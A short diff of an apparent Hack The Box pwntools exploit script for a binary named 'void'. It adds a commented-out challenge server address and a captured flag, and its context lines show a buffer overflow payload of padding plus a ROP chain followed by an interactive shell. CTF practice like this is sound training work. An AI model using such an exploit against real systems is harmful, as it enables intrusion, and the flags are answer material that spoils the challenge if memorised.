@@ -13,6 +13,7 @@ libc = ELF('./glibc/libc.so.6')
 padding = offset*b'A'
 
 #ip, port='161.35.168.118', 30070
+#ip, port = '138.68.139.144', 31414   #HTB
 #io = remote(ip,port)
 io = process('./void')
 
@@ -59,3 +60,5 @@ payload = padding + rop_chain
 io.sendline(payload)
 io.interactive()
 #HTB{r3s0lv3_th3_d4rkn355}
+
+#HTB{pwnt00l5_h0mep4g3_15_u54ful}
